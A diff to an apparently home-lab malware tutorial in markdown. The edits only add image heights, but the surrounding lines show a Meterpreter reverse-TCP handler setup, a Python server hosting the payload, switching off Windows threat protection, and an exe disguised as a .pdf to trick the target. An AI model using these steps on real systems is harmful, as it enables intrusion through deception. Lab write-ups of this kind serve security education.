@@ -54,7 +54,7 @@ $ set payload windows/x64/meterpreter_reverse_tcp
 $ set lhost 192.168.10.250
 $ exploit
 ```
-<img src="https://i.imgur.com/z9RtONS.png.png" width="400" ><img src="https://i.imgur.com/W9bY3QX.png" width="370" > <br> <sup>Ref 3: Change name & Lhost </sup>
+<img src="https://i.imgur.com/z9RtONS.png.png" width="400" height="98" ><img src="https://i.imgur.com/W9bY3QX.png" width="370" > <br> <sup>Ref 3: Change name & Lhost </sup>
 
 **Setup HTTP Server** <br>
 Open a new terminal, Change the directory to where the malware is `desktop` Create a web server to host malware with Python using port 9999
@@ -75,10 +75,10 @@ Search for Virus & Threat Protection. Click on manage setting protection and dis
 Open a web browser and type in `192.168.10.250:9999` <br> Click it and the download will start. <br>
 When the malware is executed it will seem nothing has happened however the program is running.
 
-<img src="https://i.imgur.com/ZZeIFyj.png" width="300" > <img src="https://i.imgur.com/ML2iFOp.png" width="370" > <br> <sup>Ref 6: Hosting file & Executable running </sup>
+<img src="https://i.imgur.com/ZZeIFyj.png" width="300" height="235" > <img src="https://i.imgur.com/ML2iFOp.png" width="370" > <br> <sup>Ref 6: Hosting file & Executable running </sup>
 
 ⚠️The file extension is not shown tricking the target into believing this is a `.pdf` file however it is an exe ⚠️ <br>
-<img src="https://i.imgur.com/zModtgC.png" width="400" > <img src="https://i.imgur.com/kf8TKNH.png" width="400" > <br> <sup>Ref 7: File name is used to trick the target into thinking the file is a .pdf </sup>
+<img src="https://i.imgur.com/zModtgC.png" width="400" > <img src="https://i.imgur.com/kf8TKNH.png" width="400"  height="160" > <br> <sup>Ref 7: File name is used to trick the target into thinking the file is a .pdf </sup>
 
 Run command prompt as admin. Find if an active established connection from Linux has been created with the Windows machine 
 ```bash
